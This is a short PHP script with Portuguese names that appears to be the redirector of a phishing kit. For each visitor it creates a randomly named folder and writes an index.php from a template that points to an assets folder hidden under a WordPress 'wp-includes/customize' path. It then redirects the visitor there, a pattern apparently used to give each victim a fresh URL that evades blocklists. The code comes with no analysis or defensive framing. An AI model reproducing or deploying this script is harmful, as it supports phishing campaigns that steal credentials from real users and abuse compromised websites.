<?php

$arquivos = "https://www.picturebear.dk/wp-includes/customize/--/arquivos/";

$url_atual = "https://$_SERVER[HTTP_HOST]$_SERVER[PHP_SELF]";
$dir_atual = explode('index.php', $url_atual);

function randomKey($length) {
	$key = "";
	$pool = array_merge(range(0,9), range('a', 'z'),range('A', 'Z'));
	for($i=0; $i < $length; $i++) {
		$key .= $pool[mt_rand(0, count($pool) - 1)];
	}
	return $key;
}

function criaDir($pasta, $link_arquivos){
	mkdir($pasta);
	$txt = file_get_contents('index.txt'); // copia o index
	$txt = str_replace('[LINK_ARQUIVOS]', $link_arquivos, $txt);
	$indx = fopen($pasta."/index.php", "a+");
	fwrite($indx, $txt);
	fclose($indx);
}
	
$randdir = $prefixo_da_pasta.randomKey(20); // nome da nova pasta
criaDir($randdir, $arquivos);

header('Location: '.$dir_atual[0].$randdir);

?>